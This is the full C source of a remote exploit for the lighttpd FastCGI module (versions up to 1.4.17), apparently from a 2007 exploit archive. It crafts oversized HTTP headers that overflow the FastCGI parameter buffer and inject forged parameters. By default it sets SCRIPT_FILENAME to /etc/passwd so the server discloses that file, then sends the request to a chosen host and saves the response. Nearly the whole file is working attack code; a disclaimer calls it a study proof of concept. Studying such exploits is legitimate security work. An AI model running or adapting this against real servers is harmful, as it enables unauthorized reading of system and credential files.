/***********************************************************
 * hoagie_lighttpd.c
 * LIGHTTPD/FASTCGI REMOTE EXPLOIT (<= 1.4.17)
 *
 * Bug discovered by:
 * Mattias Bengtsson <mattias@secweb.se>
 * Philip Olausson <po@secweb.se>
 * http://www.secweb.se/en/advisories/lighttpd-fastcgi-remote-vulnerability/
 *
 * FastCGI:
 * http://www.fastcgi.com/devkit/doc/fcgi-spec.html
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
 * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
 * DAMAGE DONE USING THIS PROGRAM.
 *
 * VOID.AT Security
 * andi@void.at
 * http://www.void.at
 *
 ************************************************************/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* don't change this values except you know exactly what you are doing */
#define REQUEST_SIZE_BASE     0x1530a

char FILL_CHAR[] = "void";
char RANDOM_CHAR[] = "01234567890"
                     "abcdefghijklmnopqrstuvwxyz"
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZ";


/* just default values */
#define DEFAULT_SCRIPT        "/index.php"   /* can be changed via -s */
#define DEFAULT_PORT          "80"           /* can be changed via -p */
#define DEFAULT_NAME          "SCRIPT_FILENAME" /* can be changed via -n */
#define DEFAULT_VALUE         "/etc/passwd"  /* can be change via -a */

#define DEFAULT_SEPARATOR     ','

#define BUFFER_SIZE           1024

/* header data type
 * defining header name/value content and length
 * if a fixed value is set use this one instead of generating content
 */
struct header_t {
   int  name_length;
   char name_char;
   int  value_length;
   char value_char;
   char *value_value;
};

/* generate_param
 * generate character array (input: comma separated list)
 */
char *generate_param(int *param_size_out,
                     char **name,
                     char **value) {
   char *param = NULL;
   int  param_size = 0;
   int  param_offset = 0;
   int  i;
   int  name_length = 0;
   int  value_length = 0;

   for (i = 0; name[i] != NULL && value[i] != NULL; i++) {
      name_length = strlen(name[i]);
      value_length = strlen(value[i]);
      if (name_length > 127) {
         param_size += 4;
      } else {
         param_size++;
      }
      if (value_length > 127) {
         param_size += 4;
      } else {
         param_size++;
      }
      param_size += strlen(name[i]) + strlen(value[i]);
      param = realloc(param, param_size);
      if (param) {
         if (strlen(name[i]) > 127) {
            param[param_offset++] = (name_length >> 24) | 0x80;
            param[param_offset++] = (name_length >> 16) & 0xff;
            param[param_offset++] = (name_length >> 8) & 0xff;
            param[param_offset++] = name_length & 0xff;
         } else {
            param[param_offset++] = name_length;
         }
         if (strlen(value[i]) > 127) {
            param[param_offset++] = (value_length >> 24) | 0x80;
            param[param_offset++] = (value_length >> 16) & 0xff;
            param[param_offset++] = (value_length >> 8) & 0xff;
            param[param_offset++] = value_length & 0xff;
         } else {
            param[param_offset++] = value_length;
         }
         memcpy(param + param_offset, name[i], name_length);
         param_offset += name_length;
         memcpy(param + param_offset, value[i], value_length);
         param_offset += value_length;
      }
   }

   if (param) {
      *param_size_out = param_size;
   }

   return param;
}

/* generate_buffer
 * generate header name or value buffer
 */
char *generate_buffer(int length, char c, int random_mode) {
   char *buffer = (char*)malloc(length + 1);
   int i;

   if (buffer) {
      memset(buffer, 0, length + 1);
      if (random_mode) {
         for (i = 0; i < length; i++) {
            buffer[i] = RANDOM_CHAR[rand() % (strlen(RANDOM_CHAR))];
         }
      } else {
         memset(buffer, c, length);
      }
   }

   return buffer;
}

/* generate_array
 * generate character array (input: comma separated list)
 */
char **generate_array(char *list, char separator, int *length) {
   char **data = NULL;
   int i = 0;
   int start = 0;
   int j = 1;

   if (list) {
      for (i = 0; i <= strlen(list); i++) {
         if (list[i] == separator ||
             i == strlen(list)) {
            data = realloc(data, (j + 1) * (sizeof(char*)));
            if (data) {
               data[j - 1] = malloc(i - start + 1);
               if (data[j - 1]) {
                  strncpy(data[j - 1], list + start, i - start);
                  data[j - 1][i - start + 1] = 0;
               }
               data[j] = NULL;
            }
            start = i + 1;
            j++;
         }
      }
      *length = j;
   }

   return data;
}

/* generate_request
 * generate http request to trigger the overflow in fastcgi module
 * and overwrite fcgi param data with post content
 */
char *generate_request(char *server, char *port,
                       char *script, char **names,
                       char **values, int *length_out,
                       int random_mode) {
   char *param;
   int  param_size;
   char *request;
   int  offset;
   int  length;
   int  i;
   int  fillup;
   char *name;
   char *value;

   /* array of header data that is used to create header name and value lines 
    * most of this values can be changed -> only length is important and a
    * few characters */
   struct header_t header[] = {
      { 0x01, '0', 0x04, FILL_CHAR[0], NULL },
      { FILL_CHAR[0] - 0x5 - 0x2, 'B', FILL_CHAR[0] - 0x2, 'B', NULL },
      { 0x01, '1', 0x5450 - ( (FILL_CHAR[0] + 0x1) *  2) - 0x1 - 0x5 - 0x1 - 0x4, 'C', NULL },
      { 0x01, '2', '_' - 0x1 - 0x5 - 0x1 - 0x1, 'D',  NULL },
      { 0x01, '3', 0x04, FILL_CHAR[1], NULL },
      { FILL_CHAR[1] - 0x5 - 0x2, 'F', FILL_CHAR[1] - 0x2, 'F', NULL },
      { 0x01, '4', 0x5450 - ( (FILL_CHAR[1] + 0x1) *  2) - 0x1 - 0x5 - 0x1 - 0x4, 'H', NULL },
      { 0x01, '5', '_' - 0x1 - 0x5 - 0x1 - 0x1, 'I',  NULL },
      { 0x01, '6', 0x04, FILL_CHAR[2], NULL },
      { FILL_CHAR[2] - 0x5 - 0x2, 'K', FILL_CHAR[2] - 0x2, 'K',  NULL },
      { 0x01, '7', 0x5450 - ( (FILL_CHAR[2] +  0x1) *  2) - 0x1 - 0x5 - 0x1 - 0x4, 'L', NULL },
      { 0x01, '8', '_' - 0x1 - 0x5 - 0x1 - 0x1, 'M', NULL },
      { 0x01, '9', 0, 0, "uvzz" },
      { FILL_CHAR[3] - 0x5 - 0x2, 'O', FILL_CHAR[3] - 0x2, 'O',  NULL },
      { 0x01, 'z', 0x1cf - ((FILL_CHAR[3]- 0x1 ) * 2) -0x1 - 0x5 - 0x1 - 0x4, 'z',  NULL },
      { 0x00, 0x00, 0x00, 0x00, NULL }
   };

   /* fill rest of post content with data */
   char content_part_one[] = {
      0x06, 0x80, 0x00, 0x00, 0x00, 'H', 'T', 'T', 'P', '_', 'W' 
   };

   /* set a fake FastCGI record to mark the end of data */
   char content_part_two[] = {
      0x01, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
   };

   param = generate_param(&param_size, names, values);
   if (param && param_size > 0) {
      fillup = 0x54af - 0x5f - 0x1e3 - param_size - 0x1 - 0x5 - 0x1 - 0x4;
      length = REQUEST_SIZE_BASE + param_size +
               strlen(server) + strlen(port) +
               strlen(script);
      request = (char*)malloc(length);
      if (request) {
         memset(request, 0, length);
         offset = sprintf(request,
                          "POST %s HTTP/1.1\r\n"
                          "Host: %s:%s\r\n"
                          "Connection: close\r\n"
                          "Content-Length: %d\r\n"
                          "Content-Type: application/x-www-form-urlencoded\r\n",
                          script,
                          server, port,
                          fillup + param_size + sizeof(content_part_one) +
                          sizeof(content_part_two) + 0x5f);
         for (i = 0; header[i].name_length != 0; i++) {
            name = generate_buffer(header[i].name_length,
                                   header[i].name_char,
                                   header[i].name_length != 1 ? random_mode : 0);

            if (header[i].value_value) {
               value = header[i].value_value;
            } else {
               value = generate_buffer(header[i].value_length,
                                       header[i].value_char,
                                       header[i].value_length != 4 &&
                                       header[i].value_char != 'z' ? random_mode : 0);
            }

            offset += sprintf(request + offset,
                              "%s: %s\r\n", name, value);
            if (!header[i].value_value) {
               free(value);
            }
            free(name);
         }

         offset += sprintf(request + offset, "\r\n");

         memcpy(request + offset, param, param_size);
         offset += param_size;
 
         content_part_one[0x03] = (fillup >> 8) & 0xff;
         content_part_one[0x04] = fillup & 0xff;
         for (i = 0; i < sizeof(content_part_one); i++) {
            request[offset++] = content_part_one[i];
         }
         for (i = 0; i < fillup + 0x5f; i++) {
            request[offset++] = random_mode ? RANDOM_CHAR[rand() % (strlen(RANDOM_CHAR))] : 'W';
         }
         for (i = 0; i < sizeof(content_part_two); i++) {
            request[offset++] = content_part_two[i];
         }

         *length_out = offset;
      }
   }

   return request;
}

/* usage
 * display help screen
 */
void usage(int argc, char **argv) {
   fprintf(stderr,
           "usage: %s [-h] [-v] [-r] [-d <host>] [-s <script>] [-p <port>]\n"
           "       [-n <header names>] [-a <header values>] [-o <output>]\n"
           "\n"
           "-h        help\n"
           "-v        verbose\n"
           "-r        enable random mode\n"
           "-d host   HTTP server\n"
           "-p port   HTTP port (default: %s)\n"
           "-s script script url on remote server (default: %s)\n"
           "-n value  header names (comma seperated, default: %s)\n"
           "-a value  header values (comma seperated, default: %s)\n"
           "-o output save result in output file\n"
           "\n"
           ,
           argv[0],
           DEFAULT_PORT,
           DEFAULT_SCRIPT,
           DEFAULT_NAME,
           DEFAULT_VALUE);
   exit(1);           
}

/* connect_to
 * connect to remote http server
 */
int connect_to(char *host, int port) {
   struct sockaddr_in s_in;
   struct hostent *he;
   int s;

   if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
      return -1;
   }

   memset(&s_in, 0, sizeof(s_in));
   s_in.sin_family = AF_INET;
   s_in.sin_port = htons(port);

   if ( (he = gethostbyname(host)) != NULL)
       memcpy(&s_in.sin_addr, he->h_addr, he->h_length);
   else {
       if ( (s_in.sin_addr.s_addr = inet_addr(host) ) < 0) {
          return -3;
       }
   }  

   if (connect(s, (struct sockaddr *)&s_in, sizeof(s_in)) == -1) {
      return -4;
   }

   return s;
}

/* parse_response
 * parse response data from http server
 */
void parse_response(char *response, int response_length, char *output) {
   char *p;
   int http_code;
   int header_mode = 1;
   int size;
   int bytes = 0;
   FILE *fp = stdout;

   p = strtok(response, "\r\n");
   while (p) {
      /* header mode active? */
      if (header_mode) {
         if (strstr(p, "HTTP/1.1 ") == p) {
            sscanf(p, "HTTP/1.1 %d", &http_code);
            if (http_code == 200) {
               printf("[*] request successful\n");
            } else {
               printf("[*] request failed (error code: %d)\n", http_code);
            }
         } else if (strstr(p, "Server: ") == p) {
            printf("[*] server version: %s\n", strstr(p, "Server: ") + 8);
         /* content length for first content */
         } else if (!strchr(p, ':') && http_code == 200) {
            sscanf(p, "%x", &size);
            header_mode = 0;
            if (output) {
               fp = fopen(output, "w");
            }
         }
      } else {
         if (bytes < size) {
            fprintf(fp, "%s\n", p);
            bytes += strlen(p) + 1;
         }
      }
      p = strtok(NULL, "\r\n");
   }
   if (fp != stdout && fp != NULL) {
      printf("[*] %d bytes written to %s\n", bytes, output);
      fclose(fp);
   }
}

/* main entry
 */
int main(int argc, char **argv) {
   char *server = NULL;
   char *port = DEFAULT_PORT;
   char *script = DEFAULT_SCRIPT;
   char **name = NULL;
   int name_length = 0;
   char **value = NULL;
   int value_length = 0;
   char *request = NULL;
   int request_length = 0;
   int i;
   int random_mode = 0;
   int verbose = 0;
   int s;
   char c;
   fd_set fs;
   int bytes;
   char buffer[BUFFER_SIZE];
   char *response = NULL;
   int response_length = 0;
   char *output = NULL;

   fprintf(stderr,
           "hoagie_lighttpd.c - lighttpd(fastcgi) <= 1.4.17 remote\n"
           "-andi / void.at\n\n");

   if (argc < 2) {
      usage(argc, argv);
   } else {
      while ((c = getopt (argc, argv, "hvrd:p:s:u:n:a:o:")) != EOF) {
         switch (c) {
            case 'h':
                 usage(argc, argv);
                 break;
            case 'd':
                 server = optarg;
                 break;
            case 'p':
                 port = optarg;
                 break;
            case 's':
                 script = optarg;
                 break;
            case 'n':
                 name = generate_array(optarg, DEFAULT_SEPARATOR, &name_length);
                 break;
            case 'a':
                 value = generate_array(optarg, DEFAULT_SEPARATOR, &value_length);
                 break;
            case 'r':
                 random_mode = 1;
                 srand(time(NULL));
                 break;
            case 'v':
                 verbose = 1;
                 break;
            case 'o':
                 output = optarg;
                 break;
            default:
                 fprintf(stderr, "[*] unknown command line option '%c'\n", c);
                 exit(-1);
         }
      }

      if (!name) {
         name = generate_array(DEFAULT_NAME, DEFAULT_SEPARATOR, &name_length);
      }

      if (!value) {
         value = generate_array(DEFAULT_VALUE, DEFAULT_SEPARATOR, &value_length);
      }


      if (name_length != value_length) {
         fprintf(stderr,
                 "[*] check -n and -n parameter (argument list doesnt match)\n");
      } else if (!server) {
         fprintf(stderr, "[*] server is missing\n");
      } else {
         if (random_mode) {
            for (i = 0; i < 4; i++) {
               FILL_CHAR[i] = RANDOM_CHAR[rand() % (strlen(RANDOM_CHAR))];
            }
         }
         printf("[*] creating request (filler: %c/%c/%c/%c, random: %s)\n",
                FILL_CHAR[0], FILL_CHAR[1], FILL_CHAR[2], FILL_CHAR[3],
                random_mode ? "on": "off");
         for (i = 0; name[i]; i++) {
            printf("[*] set header [%s]=>[%s]\n", name[i], value[i]);
         }
         request = generate_request(server, port, script, name, value,
                                    &request_length, random_mode);
         if (verbose) {
            printf("[*] sending [");
            write(1, request, request_length);
            printf("]\n");
         } 
         if (request) {
            printf("[*] connecting to %s:%s ...\n", server, port);
            s = connect_to(server, atoi(port));
            if (s > 0) {
               FD_ZERO(&fs);
               FD_SET(s, &fs);
               printf("[*] request url %s\n", script);
               write(s, request, request_length);
               do {
                  select(s + 1, &fs, NULL, NULL, NULL);
                  bytes = read(s, buffer, sizeof(buffer));
                  if (bytes > 0) {
                     response_length += bytes;
                     response = realloc(response, response_length + 1);
                     if (response) {
                        memcpy(response + response_length - bytes,
                               buffer,
                               bytes);
                     }
                  }
               } while (bytes > 0);
               close(s);
               response[response_length] = 0;
               parse_response(response, response_length, output);
            } else {
               fprintf(stderr, "[*] connect failed\n");
            }
            free(request);
         } else {
            fprintf(stderr, "[*] can't allocate memory for request\n");
         }
      }

      for (i = 0; name[i]; i++) {
         free(name[i]);
      }
      free(name);
      for (i = 0; value[i]; i++) {
         free(value[i]);
      }
      free(value);
   }

   return 0;
}

// milw0rm.com [2007-09-20]

